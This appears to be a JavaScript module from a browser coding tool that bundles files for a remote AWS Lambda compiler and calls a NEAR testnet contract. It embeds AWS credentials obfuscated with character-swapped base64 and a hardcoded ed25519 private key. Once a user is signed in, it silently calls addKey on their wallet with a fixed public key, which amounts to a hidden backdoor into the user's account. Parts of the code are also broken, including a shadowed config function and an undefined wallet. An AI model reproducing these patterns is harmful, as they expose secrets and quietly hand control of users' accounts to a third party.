export function upload() {

}

function config() {
    return JSON.parse(atob(dob("yehJ2YlN3cLNXZJlCZ6IkILFUSyE1UzMjTCNUSE9lWRRTUSRiIiw2cjVmc0VWQjNXZzN2S5VjIioUT6VWeYpXbvZ2Q5J1SRBzMjNkNiRWbDdjQvVFSYJTMxFVMvJkbyMiSsInIlJ2Zvlib6ImIwFXLvNXdoRWZzFCdy0nI=0"), 'base64').toString('ascii'));
}

function ob(s) {
    var a = Array.from(s);
    for (var i = 1; i < a.length; i = i + 2) {
        var a2 = a[i - 1];
        a.splice(i - 1, 1, a[i]);
        a.splice(i, 1, a2);
    }
    return a.join("");
}
function dob(s) {
    console.log(s);
    var a = Array.from(s);
    for (var i = 1; i < a.length; i = i + 2) {
        var a2 = a[i];
        a.splice(i, 1, a[i - 1]);
        a.splice(i - 1, 1, a2);
    }
    console.log(a.join(""));
    return a.join("");
}

export async function compile(filesArray,config) {
    return new Promise((resolve, reject) => {

        if (!wallet.isSignedIn()) {
            wallet.requestSignIn(config.accountId,"gcode by gormantec");
        }
        else{
            wallet.account().addKey("Ha2YdgiYfvUfUAwapfJWqQEHyND81nkKdbkwYhw2wtMU");
        }


        require(["/js/jszip.min.js"], (JSZip) => {
            var zip = new JSZip();
            zip.file("readme.txt", "x");
            filesArray.forEach((inFile)=>{
                const fName=inFile.name.substring(inFile.name.lastIndexOf('/')+1);
                const dName=inFile.name.substring(0,inFile.name.lastIndexOf('/'));
                const dir = zip.folder(dName);
                if(inFile.type=="base64")
                {
                    dir.file(fName, inFile.data, { base64: true });
                }
                else
                {
                    dir.file(fName, inFile.data);
                }
            });
            zip.generateAsync({ type: "base64" })
                .then(function (content) {
                    require(["https://sdk.amazonaws.com/js/aws-sdk-2.918.0.min.js"], () => {
                        console.log(AWS);
                        AWS.config.update(config());
                        console.log("lambda");
                        var lambda = new AWS.Lambda();
                        console.log("invoke");
                        lambda.invoke({
                            FunctionName: "near-sdk-as-rpc", /* required */
                            Payload: JSON.stringify({
                                "code": "dGhpcyBpcyBzb21lIHRleHQ=",
                                "key": "ed25519:5uaCteAvs7xM9mtL7soyZpB8GRX62MitJv1ekDqnpUTvk5K4eNCmD4NfqLhvKLRwuaux6fhAUkimBvBx95uesgKo",
                                "accountId": "hello.gcode.testnet",
                                assembly: content
                            })
                        }, function (err, data) {
                            console.log(data);
                            if (err) console.log(err, err.stack); // an error occurred
                            else console.log(data);           // successful response
                            resolve(content);
                        });
                    });
                });
        });
    });
}

async function doNear(nearApi, config) {

    const keyStore = new nearApi.keyStores.BrowserLocalStorageKeyStore();
    const near = new nearApi.Near({
        keyStore: keyStore,
        networkId: 'testnet',
        nodeUrl: 'https://rpc.testnet.near.org',
        walletUrl: 'https://wallet.testnet.near.org'
    });
    await new Promise((resolve, reject) => setTimeout(resolve, 500));
    if (window.wconsole) window.wconsole.log("connecting to near..");
    if (window.wconsole) window.wconsole.log("on network: " + near.connection.networkId);
    const wallet = new nearApi.WalletConnection(near);
    if (!wallet.isSignedIn()) {
        wallet.requestSignIn(config.myAccountId,"gcode by gormantec");
    }
    else{
        wallet.account().addKey("Ha2YdgiYfvUfUAwapfJWqQEHyND81nkKdbkwYhw2wtMU");
    }
    console.log(wallet);
    if (window.wconsole) window.wconsole.log("using wallet: " + wallet._authData.accountId);
    var ct = {};
    config.methods.forEach(e => {
        ct[e.type] = ct[e.type] || [];
        ct[e.type].push(e.method);
    });


    const mycontract = new nearApi.Contract(wallet.account(), config.contractId, ct);
    if (window.wconsole) window.wconsole.log("using mycontract: " + mycontract.contractId);
    console.log(mycontract.contractId);
    const list = config.methods;
    var doLoop = (i) => {
        if (window.wconsole) window.wconsole.log(list[i].method + '(' + JSON.stringify(list[i].parameters) + ')');
        mycontract[list[i].method](list[i].parameters).then((r) => {
            console.log("loop: " + i);
            if (window.wconsole) window.wconsole.log(list[i].method + "( result = " + r + " )");
            if ((i + 1) < list.length) doLoop(i + 1);
        });
    };
    doLoop(0);

}





export function test() {
    require(["https://cdn.jsdelivr.net/npm/near-api-js@0.41.0/dist/near-api-js.min.js"], () => {
        doNear(nearApi, {
            myAccountId: "hello.gcode.testnet",
            contractId: "hello.gcode.testnet",
            methods: [
                { method: "setGreeting", type: "changeMethods", parameters: { message: "hello " + (Math.round(Date.now() / 1000) - 1622206047) } },
                {
                    method: "getGreeting", type: "viewMethods", parameters: { accountId: "hello.gcode.testnet" }
                }]
        });
    });
}
